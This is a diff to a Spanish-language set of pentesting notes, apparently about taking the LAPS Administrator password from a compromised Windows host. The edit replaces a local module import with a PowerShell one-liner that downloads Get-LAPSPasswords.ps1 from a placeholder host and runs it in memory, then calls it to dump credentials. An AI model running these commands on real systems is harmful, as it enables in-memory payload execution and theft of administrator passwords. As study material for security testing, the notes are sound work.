@@ -166,8 +166,8 @@ Pasos:
 
 Pasos:
 ❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y y transferirlo a la máquina Windows comprometida
-❯ Import-Module Get-LAPSPasswords.ps1        # Importar el modulo 
-❯ Get-LAPSPasswords                          # Ejecutar la función para obtener la password de Administrator
+❯ IEX (New-Object Net.WebClient).DownloadString('https://IP/Get-LAPSPasswords.ps1')  # Importar el modulo 
+❯ Get-LAPSPasswords          # Ejecutar la función para obtener la password de Administrator
 ```
 
 
